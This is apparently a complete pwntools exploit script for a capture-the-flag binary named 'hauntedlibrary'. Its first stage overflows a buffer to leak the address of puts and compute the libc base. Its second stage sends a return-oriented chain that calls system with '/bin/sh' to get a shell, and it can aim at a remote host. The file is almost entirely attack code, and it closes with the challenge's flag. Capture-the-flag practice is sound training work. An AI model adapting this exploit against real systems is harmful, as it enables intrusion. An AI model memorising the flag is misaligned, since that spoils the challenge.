from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = './hauntedlibrary_patched'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")

offset = 88

io = start()

leak = elf.sym["book_of_the_dead"]



payload = flat([
    b"A"*offset,
    p64(leak),
    p64(elf.sym["checkout"])
])

io.sendlineafter(b'>', b'2')
io.sendlineafter(b'>', payload)
io.recvuntil(b'uts(): ')

puts = int(io.recvline().strip(),16)
libc.address = puts - libc.sym["puts"]
system = libc.sym["system"]
binsh = next(libc.search(b"/bin/sh"))
pop_rdi = libc.address + 0x102dea
ret = libc.address + 0xf0761
info(f'puts leak: %#x',puts)
info(f'libc base: %#x',libc.address)
info(f'libc system: %#x',system)
info(f'libc binsh: %#x',binsh)


payload = flat([
    b"A"*offset,
    p64(pop_rdi),
    p64(binsh),
    p64(ret),
    p64(system)
])

io.sendlineafter(b'>', payload)



io.interactive()

#deadface{TH3_L1BR4RY_KN0W5_4LL}
